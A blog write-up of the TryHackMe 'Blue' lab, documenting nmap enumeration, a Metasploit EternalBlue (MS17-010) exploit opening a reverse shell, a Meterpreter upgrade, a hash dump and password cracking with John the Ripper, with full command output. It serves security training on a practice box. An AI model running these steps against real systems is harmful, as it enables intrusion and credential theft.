+++
title = "Blue on Try Hack Me Write-up"
author = ["funcsec"]
date = 2022-01-22
publishDate = 2022-01-22
lastmod = 2022-01-22T23:45:38-08:00
tags = ["windows", "eternal blue", "thm", "john", "metasploit"]
categories = ["redteam", "writeup"]
draft = false
toc = "true +"
omit_header_text = "+"
background_color_class = "bg-black-60"
description = "Write-up on the Try Hack Me box called Blue"
featured_image = "images/alphonse-mucha_cocorico.jpg"
images = ["images/alphonse-mucha_cocorico.jpg"]
+++

In experimenting more with how to effectively report, I've found that when I have issues with tools or access, I report less in realtime.
Might need to fix that.
I feel like I'm missing some in this report, but that's fine.
Penetration is report writing, with some fun mixed in.
I want to get familar with OWASP and the other frameworks to be able immediately know what.

---


## Executive Summary {#executive-summary}

The target machine was susceptible to a well known vulnerability in Windows file sharing and authentication.
This is a vulnerable and outdated components vulnerability, though OWASP might not cover this machine as it is not supposed to be internet facing.


## Methodology {#methodology}

The first step of this engagement was to enumerate the open ports and services on the target machine.


### Enumeration {#enumeration}

This was done with `nmap`.

```bash
nmap -sV -sC $ip
```

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 22:12 EST
Nmap scan report for 10.10.228.141
Host is up (0.14s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2022-01-19T03:14:11+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2022-01-18T03:04:17
|_Not valid after:  2022-07-20T03:04:17
| rdp-ntlm-info:
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-01-19T03:14:06+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h11m59s, deviation: 2h41m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:c0:b7:2a:d8:77 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-18T21:14:06-06:00
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-01-19T03:14:06
|_  start_date: 2022-01-19T03:04:12

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.09 seconds
```

From the scan, the interesting parts were:

computername
: Jon-pc

Computer OS
: Windows 7SP1

This target machine was likely vulnerable to CVE-2017-0144 also know as Eternal Blue.


### Exploitation and Privilege Escalation {#exploitation-and-privilege-escalation}

Using the exploit included in Metasploit for Eternal Blue, which affects a vulnerability in Windows SMB.
Care was taken to set the `LHOST` value, as the attacking box had multiple IP addresses assigned to it.

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.2.105.89:4444
[*] 10.10.236.38:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.236.38:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.236.38:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.236.38:445 - The target is vulnerable.
[*] 10.10.236.38:445 - Connecting to target for exploitation.
[+] 10.10.236.38:445 - Connection established for exploitation.
[+] 10.10.236.38:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.236.38:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.236.38:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.236.38:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.236.38:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.236.38:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.236.38:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.236.38:445 - Sending all but last fragment of exploit packet
[*] 10.10.236.38:445 - Starting non-paged pool grooming
[+] 10.10.236.38:445 - Sending SMBv2 buffers
[+] 10.10.236.38:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.236.38:445 - Sending final SMBv2 buffers.
[*] 10.10.236.38:445 - Sending last fragment of exploit packet!
[*] 10.10.236.38:445 - Receiving response from exploit packet
[+] 10.10.236.38:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.236.38:445 - Sending egg to corrupted connection.
[*] 10.10.236.38:445 - Triggering free of corrupted buffer.
[-] 10.10.236.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.236.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.236.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.236.38:445 - Connecting to target for exploitation.
[+] 10.10.236.38:445 - Connection established for exploitation.
[+] 10.10.236.38:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.236.38:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.236.38:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.236.38:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.236.38:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.236.38:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.236.38:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.236.38:445 - Sending all but last fragment of exploit packet
[*] 10.10.236.38:445 - Starting non-paged pool grooming
[+] 10.10.236.38:445 - Sending SMBv2 buffers
[+] 10.10.236.38:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.236.38:445 - Sending final SMBv2 buffers.
[*] 10.10.236.38:445 - Sending last fragment of exploit packet!
[*] 10.10.236.38:445 - Receiving response from exploit packet
[+] 10.10.236.38:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.236.38:445 - Sending egg to corrupted connection.
[*] 10.10.236.38:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.236.38
[+] 10.10.236.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.236.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.236.38:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 1 opened (10.2.105.89:4444 -> 10.10.236.38:49170 ) at 2022-01-19 00:53:15 -0500


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----


C:\Windows\system32>

```

Now that there was a shell connection back to the attacking box, that shell connection could be upgraded to a Meterpreter session.
This gave more functionality to the reverse shell.

```text
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    10.2.105.89      no        IP of host that will receive the connection from the payload (Will try
                                       to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on

msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.105.89:4433
[*] Post module execution completed
[*] Sending stage (200262 bytes) to 10.10.236.38
[*] Meterpreter session 2 opened (10.2.105.89:4433 -> 10.10.236.38:49182 ) at 2022-01-19 01:02:57 -0500
[*] Stopping exploit/multi/handler

```

The meterpreter sessions was then migrated into the `conhost.exe` service

```text
meterpreter > ps
2984  548   conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                        EM                 2\conhost.exe
```

```text
meterpreter > migrate 2984
[*] Migrating from 2816 to 2984...
[*] Migration completed successfully.
```

Then the hashes can be dumped to be offline brute forced on the attacking machine.

```text
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The has for `Jon` was fed into `john`, the brute force hashing tool called John the Ripper.
The hash was run against the `rockyou.txt` wordlist.

```text
kali@kali-vm:~$ echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > /tmp/crack
kali@kali-vm:~$ john --format=NT --wordlist=/tmp/rockyou.txt /tmp/crack
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:00 DONE (2022-01-19 01:57) 1.724g/s 17586Kp/s 17586Kc/s 17586KC/s alqui..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

Cracking the hash was largely procedural, as the `meterpreter` shell was already running with `system` privilege.
The password ended up being `alqfna22` for the user Jon.
This may have been useful for other machines if the scope exceeded one machine, or any documents were found that contained encrypted data.

There were three flags on this box. One in the `C:\` directory.

```text
meterpreter > ls
Listing: C:\
============

Mode            Size   Type  Last modified              Name
----            ----   ----  -------------              ----
040777/rwxrwxr  0      dir   2018-12-12 22:13:36 -0500  $Recycle.Bin
wx
040777/rwxrwxr  0      dir   2009-07-14 01:08:56 -0400  Documents and Settings
wx
040777/rwxrwxr  0      dir   2009-07-13 23:20:08 -0400  PerfLogs
wx
040555/r-xr-xr  4096   dir   2019-03-17 18:22:01 -0400  Program Files
-x
040555/r-xr-xr  4096   dir   2019-03-17 18:28:38 -0400  Program Files (x86)
-x
040777/rwxrwxr  4096   dir   2019-03-17 18:35:57 -0400  ProgramData
wx
040777/rwxrwxr  0      dir   2018-12-12 22:13:22 -0500  Recovery
wx
040777/rwxrwxr  4096   dir   2022-01-19 01:16:26 -0500  System Volume Information
wx
040555/r-xr-xr  4096   dir   2018-12-12 22:13:28 -0500  Users
-x
040777/rwxrwxr  16384  dir   2022-01-19 00:51:46 -0500  Windows
wx
100666/rw-rw-r  24     fil   2019-03-17 15:27:21 -0400  flag1.txt
w-
000000/-------  0      fif   1969-12-31 19:00:00 -0500  hiberfil.sys
--
000000/-------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys
--

meterpreter > cat flag1.txt
flag{[ REDACTED ]}
```

The next flag was in the SAM (Security Account Manager) database location at `C:\Windows\system32\config`.

```text

meterpreter > ls
Listing: C:\Windows\system32\config
===================================

Mode            Size      Type  Last modified            Name
----            ----      ----  -------------            ----
100666/rw-rw-r  28672     fil   2018-12-12 18:00:40 -05  BCD-Template
w-                              00
100666/rw-rw-r  25600     fil   2018-12-12 18:00:40 -05  BCD-Template.LOG
w-                              00
100666/rw-rw-r  18087936  fil   2022-01-19 01:06:57 -05  COMPONENTS
w-                              00

...

100666/rw-rw-r  524288    fil   2019-03-17 18:21:22 -04  SYSTEM{016888cd-6c6f-11d
w-                              00                       e-8d1d-001e0bcde3ec}.TMC
                                                         ontainer0000000000000000
                                                         0002.regtrans-ms
040777/rwxrwxr  4096      dir   2018-12-12 18:03:05 -05  TxR
wx                              00
100666/rw-rw-r  34        fil   2019-03-17 15:32:48 -04  flag2.txt
w-                              00
040777/rwxrwxr  4096      dir   2010-11-20 21:41:37 -05  systemprofile
wx                              00

meterpreter > cat flag2.txt
flag{[ REDACTED ]}
```

The final flag was in the Documents folder for the user Jon at `C:\Users\Jon\Documents`.

```text

meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Music
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-12 22:13:31 -0500  My Videos
100666/rw-rw-rw-  402   fil   2018-12-12 22:13:48 -0500  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 15:26:36 -0400  flag3.txt

meterpreter > cat flag3.txt
flag{[ REDACTED ]}
```

Last step was to show proof of full compromise.

```text

C:\Users\Jon\Documents>type flag3.txt && whoami && hostname && ipconfig
flag{[ REDACTED ]}
nt authority\system
Jon-PC

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::10ee:2a28:2960:951b%14
   IPv4 Address. . . . . . . . . . . : 10.10.236.38
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```

That was a full compromise.

---

Lots of problems with `metasploit` connection and getting the exploit to work.
`LHOST` was most of the issue, but I should have figured it out way before I did.
Still a fun lab on <https://tryhackme.com>